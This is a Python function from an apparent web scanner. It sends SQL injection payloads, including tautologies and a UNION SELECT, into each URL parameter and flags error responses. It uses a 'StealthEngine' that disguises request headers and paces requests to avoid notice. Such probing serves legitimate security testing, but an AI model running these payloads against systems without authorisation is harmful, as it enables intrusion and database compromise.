import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from advanced.stealth_bypass import StealthEngine
from utils.logger import LOGGER

def test_sqli(url: str, params: dict, stealth: StealthEngine) -> list:
    """Test for SQL injection vulnerabilities in URL parameters"""
    results = []
    payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "UNION SELECT NULL,VERSION()"]

    for param in params:
        original_value = params[param]
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload

            # Rebuild the URL with the test parameter
            url_parts = list(urlparse(url))
            url_parts[4] = urlencode(test_params)
            test_url = urlunparse(url_parts)

            try:
                response = requests.get(test_url, headers=stealth.patch_headers({}), timeout=10)
                stealth.delay()

                # Basic detection based on response anomalies
                if "SQL syntax" in response.text or "MySQL" in response.text or response.status_code == 500:
                    results.append({
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "type": "SQL Injection",
                        "severity": "Critical"
                    })
            except Exception as e:
                LOGGER.debug(f"SQLi test error: {e}")
    return results
  
